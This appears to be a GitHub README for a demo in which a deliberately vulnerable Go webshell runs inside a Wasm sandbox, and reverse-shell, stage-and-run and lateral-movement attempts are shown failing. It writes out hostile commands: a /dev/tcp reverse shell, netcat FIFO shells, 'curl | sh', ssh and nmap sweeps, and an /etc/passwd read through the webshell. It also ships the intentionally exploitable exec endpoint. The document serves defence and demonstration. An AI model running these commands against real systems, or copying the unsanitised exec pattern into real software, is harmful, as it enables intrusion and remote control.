# Stopping a Webshell with a Sandbox: a live remote-shell demo

![A webshell turns one URL into a remote shell; inside a Cosmonic sandbox with no exec, files, sockets or outbound network, the bash, python and curl reverse-shell techniques are all blocked.](docs/images/webshell-sandbox-rce-hero.png)

PersonFacts is a made-up company. Its web app hides a classic **webshell**: `/exec?cmd=…&arg=…`
hands whatever you send straight to `exec.Command`. In a container that is game over. This repo
runs that exact code, unpatched, inside a deny-by-default [Cosmonic](https://cosmonic.com/)
sandbox, and lets you fire real reverse-shell and lateral-movement techniques at it. Every attack
runs. None of them can do anything.

> **You can't execute what you don't have.** A sandbox doesn't have to recognize the attack. It
> starts with nothing and hands the code only the capabilities you grant: here, inbound HTTP and
> nothing else. See [principles of secure agent platforms](https://cosmonic.com/ai-sandbox/principles/).

## The three building blocks

Almost every remote-shell technique combines: **(1)** an outbound network connection, **(2)**
binding that socket to stdin/stdout/stderr, and **(3)** spawning a shell. A detector watches for
any one of those in a context that shouldn't have it. A Wasm component was never given any of the
three.

| Button | Technique | What it attempts | In the sandbox |
|---|---|---|---|
| **Bash** | `/dev/tcp`, `mkfifo` + `nc` | `bash -i >& /dev/tcp/…/4444 0>&1`, a FIFO-fed netcat, a raw TCP dial, opening `/dev/tcp` | No bash, sh or nc to start; no `/dev`; no socket interface |
| **Python** | socket → `dup2` → `pty.spawn` | the canonical python3 one-liner, a raw TCP dial, opening `/dev/ptmx`, spawning `/bin/sh` | No interpreter; no pty; WASI has no fork, exec or dup2 |
| **Curl** | stage-and-run | `curl … \| sh`, `wget` to disk, a real fetch through the host, writing `/tmp/stage.sh`, executing it | `allowedHosts: []` so the host denies the fetch; no disk; nothing to exec with |
| **Pivot** | lateral movement ([T1021](https://attack.mitre.org/techniques/T1021/)): ssh + subnet scan | `ssh deploy@10.0.0.5`, `nc -zv`, `nmap`, reading `~/.ssh/known_hosts` and `/etc/hosts`, a DNS lookup, five TCP dials across `10.0.0.0/29`, a UDP and an ICMP probe, WinRM through the host | No ssh, nc or nmap; no files to read targets from; no socket interface; `allowedHosts: []` |
| **Run all** | all four | 27 attempts in one request | 27 of 27 blocked |

Each technique fires its real command line through the webshell's own `runCmd`, then attempts
every building block from inside the component, the way an attacker who owns the process would.
Nothing is simulated: every result is the runtime's own error. The attacker address,
`203.0.113.66`, is in TEST-NET-3 (RFC 5737) and is never routed. The lateral-movement targets are
in `10.0.0.0/29` (RFC 1918); the sweep is three addresses and three ports, a containment probe and
not a scanner.

The **Pivot** button is in the local build (`0.1.9`, below) until the next ghcr publish; the
published `0.1.6` image has the first three techniques.

## Quickstart (Cosmonic Desktop)

1. **Install [Cosmonic Desktop](https://cosmonic.com/desktop/).**
2. **Apply** [`deploy/webshell-sandbox.workload.yaml`](deploy/webshell-sandbox.workload.yaml). It
   pins the published component by digest on ghcr, so there's nothing to build. The easiest route
   is an assistant connected to Desktop's MCP server
   ([Connect coding agents](https://cosmonic.com/docs/desktop/coding-agents/)).
3. **Open <http://webshell-sandbox.localhost:8200/shell>** and press the red buttons.
   `/shell#all` fires every attack on load. PersonFacts itself is at `/`.

Or see it live at <https://webshell-sandbox.kosmonic.com/shell>.

### Build from source

You need Go (see `cosmonic-app/go.mod`) and
[`componentize-go`](https://github.com/bytecodealliance/componentize-go) `v0.3.4`:

```bash
cd cosmonic-app
componentize-go --world wasip2-example build -o webshell.wasm
wash oci push --insecure oci.localhost:8200/apps/webshell-sandbox:0.1.9 webshell.wasm
```

Then apply [`deploy/webshell-sandbox.local.workload.yaml`](deploy/webshell-sandbox.local.workload.yaml).
It pins `0.1.9` by digest; if you rebuild, bump the tag and pin your own digest
(`cosmonic_image_inspect` prints it).

### From the command line

```bash
B=http://127.0.0.1:8200; H='Host: webshell-sandbox.localhost'

curl -s -H "$H" "$B/run?mode=all"              # bash | python | curl | pivot | all, as JSON
curl -s -H "$H" "$B/run?mode=pivot"            # lateral movement only: 14 of 14 blocked
curl -s -H "$H" "$B/exec?cmd=cat&arg=/etc/passwd"
# exec: "cat": executable file not found in $PATH
curl -s -H "$H" "$B/exec?cmd=ssh&arg=deploy@10.0.0.5"
# exec: "ssh": executable file not found in $PATH
```

A run of `mode=all` reports:

```
MITIGATED: 27 of 27 attempts failed. The webshell ran, but the sandbox has no shell to start,
no socket to open and no disk to stage on.
```

## Why each step fails

| Building block | Attempt | The runtime's answer | Why |
|---|---|---|---|
| spawn | `exec.Command("bash", …)` | `executable file not found in $PATH` | No filesystem, so no `$PATH`; WASI has no call that starts a process |
| spawn | `os.StartProcess("/bin/sh")` | `Not implemented on wasip1` | No fork, no exec |
| network | `net.Dial("tcp", …)` to the attacker, or to `10.0.0.5:22`, `:445`, `:3389`, `10.0.0.6:22`, `10.0.0.7:22` | `connect: Connection refused` | The component imports no `wasi:sockets`; Go answers from an in-memory stub and no packet leaves |
| network | UDP probe to `10.0.0.5:161` | `write: Connection reset by peer` | Same: UDP has no handshake, so the stub hands back a socket object and the send fails |
| network | `net.Dial("ip4:icmp", …)` | `socket: Not supported` | Same: there is no raw socket to ask for |
| discover | `net.LookupHost("fileserver.corp.internal")` | `lookup … on [::1]:53: write udp …: Connection reset by peer` | Same: the resolver needs a socket to reach a nameserver |
| network | HTTP GET via `wasi:http/outgoing-handler` (the stage, or WinRM on `10.0.0.5:5985`) | `HTTP-request-denied` | The workload grants `allowedHosts: []`; the host denies it before any connection |
| bind / stage | open `/dev/tcp/…`, `/dev/ptmx`, `/tmp/stage.sh` | `Bad file number` | No volume granted: there is no directory to resolve any path against |
| discover | read `~/.ssh/known_hosts`, `/etc/hosts` | `Bad file number` | Same: no volume, so no `/etc` and no home directory |

The security policy is the workload manifest, and it is short because it grants almost nothing:
one inbound HTTP route, no volumes, no outbound hosts.

## Lateral movement (MITRE ATT&CK T1021)

A remote shell is the foothold; the next move is to reach the machines next to it. The **Pivot**
button tries that: `ssh` to an internal host and a small subnet scan, first as command lines through
the webshell, then as the calls those tools make. All 14 attempts fail at the boundary the first
three techniques already hit. Nothing was added to the manifest to stop them.

That boundary is the component's world.
[`cosmonic-app/wit/world.wit`](cosmonic-app/wit/world.wit) includes `wasi:http/proxy` and nothing
else, and `cosmonic_image_inspect` on the built `0.1.9` image confirms what the component imports:
`wasi:cli`, `wasi:clocks`, `wasi:filesystem` (with no volume behind it), `wasi:http`, `wasi:io` and
`wasi:random`. There is **no `wasi:sockets` import**. A connection to `10.0.0.5:22` is not denied by
a rule that names the address; the component has no function to call that opens one. The only
network path it can ask for is `wasi:http/outgoing-handler`, and the workload answers that with
`allowedHosts: []`.

The related techniques need the same absent capability, so the same result applies to them. This
demo attempts T1021, T1046 and T1018 directly; the others are listed because they start from a
socket the component cannot open, not because each was fired here:

| Technique | Needs | Missing here |
|---|---|---|
| [T1021](https://attack.mitre.org/techniques/T1021/) remote services, and T1021.001 RDP, .002 SMB, .004 SSH, .006 WinRM | a client process, or a TCP connection to the service | no process to start; no `wasi:sockets`; `allowedHosts: []` |
| [T1570](https://attack.mitre.org/techniques/T1570/) lateral tool transfer | a connection to the next host, and a file to send | no `wasi:sockets`; no volume |
| [T1046](https://attack.mitre.org/techniques/T1046/) network service discovery | many outbound connections, or a raw socket | no `wasi:sockets` |
| [T1018](https://attack.mitre.org/techniques/T1018/) remote system discovery | host files, DNS, ARP or ping | no volume; no `wasi:sockets` |
| [T1040](https://attack.mitre.org/techniques/T1040/) network sniffing | a raw or packet socket on an interface | no `wasi:sockets`; WASI has no packet-capture interface at all |
| [T1557](https://attack.mitre.org/techniques/T1557/) adversary-in-the-middle | sending and receiving forged ARP, DNS or LLMNR traffic | no `wasi:sockets` |

### What this demo tests, and what is tested upstream

This is a *structural* boundary: the capability is absent from the component, where an *enforced*
boundary (a path or host check) has to get every input right. The demo tests the half that belongs
to this repo: the world, the manifest and the 14 answers. The other half, that Wasm code cannot
reach outside its linear memory or its imports to make a socket for itself, belongs to the runtime,
and is tested upstream in [Wasmtime](https://github.com/bytecodealliance/wasmtime) and not re-proved
here:

- [`crates/fuzzing/src/oracles/memory.rs`](https://github.com/bytecodealliance/wasmtime/blob/main/crates/fuzzing/src/oracles/memory.rs):
  the in-bounds and out-of-bounds memory-access oracle.
- [`crates/fuzzing/src/oracles/stacks.rs`](https://github.com/bytecodealliance/wasmtime/blob/main/crates/fuzzing/src/oracles/stacks.rs):
  the control-flow-integrity (stack) oracle.
- [`fuzz/fuzz_targets/differential.rs`](https://github.com/bytecodealliance/wasmtime/blob/main/fuzz/fuzz_targets/differential.rs):
  differential execution against the spec interpreter, wasmi and V8.
- The [WebAssembly spec test suite](https://github.com/WebAssembly/testsuite) (linear-memory
  bounds), and continuous fuzzing of those targets on
  [oss-fuzz](https://github.com/google/oss-fuzz/tree/master/projects/wasmtime).

## Layout

```
cosmonic-app/                      the Go component (componentize-go, wasip2)
  export_wasi_http_incoming_handler/
    handler.go                     routes, and the webshell: exec.Command(cmd, args...)
    attacks.go                     /run: the four techniques and their building blocks
    static/                        PersonFacts site (/), the /shell demo page and hero
deploy/
  webshell-sandbox.workload.yaml         one workload, one component, no grants (ghcr image)
  webshell-sandbox.local.workload.yaml   the same, from your own build
docs/
  hero/                            hero source (HTML) and render.sh
  images/webshell-sandbox-rce-hero.png
simpleexec-personfacts/            the original PersonFacts webshell for containers
```

## License

Apache-2.0. See [LICENSE](LICENSE).
